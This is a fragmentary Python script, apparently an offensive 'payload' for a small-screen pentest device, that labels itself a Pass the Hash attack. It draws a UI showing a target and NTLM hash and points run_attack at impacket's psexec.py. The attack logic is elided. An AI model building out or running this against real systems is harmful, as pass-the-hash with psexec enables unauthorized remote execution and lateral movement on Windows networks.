#!/usr/bin/env python3
"""
KTOx *payload* – **Pass the Hash Attack**
==============================================
...
def draw_ui(screen_state="main", message_lines=None):
    ...
    d.text((5, 5), "Pass the Hash Attack", font=FONT_TITLE, fill=(30, 132, 73))
    ...
    if message_lines:
        ...
        d.text((5, 70), f"Hash: {NTLM_HASH[:10]}...", font=FONT, fill=(242, 243, 244))
        d.text((5, 100), "OK=Attack", font=FONT, fill=(171, 178, 185))
        d.text((5, 110), "KEY1=Target | KEY2=User/Hash", font=FONT, fill=(171, 178, 185))
...
def run_attack():
    ...
    # Path to psexec.py
    psexec_path = os.path.join(KTOX_ROOT, "impacket-examples", "psexec.py")
